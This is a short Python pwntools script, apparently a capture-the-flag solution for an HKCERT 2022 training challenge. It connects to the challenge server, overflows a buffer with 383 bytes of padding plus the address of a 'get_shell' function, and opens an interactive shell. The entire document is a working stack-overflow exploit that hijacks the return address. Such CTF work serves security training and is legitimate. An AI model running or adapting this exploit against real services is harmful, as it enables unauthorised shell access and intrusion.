from pwn import *

get_shell = 0x0000000000401182

p = remote("chal.training.hkcert22.pwnable.hk", 20013)
p.recvuntil("service.")
p.sendline(b"a"*383 + p64(get_shell))
p.recvuntil("End?[Y/N]")
p.sendline('Y')

p.interactive()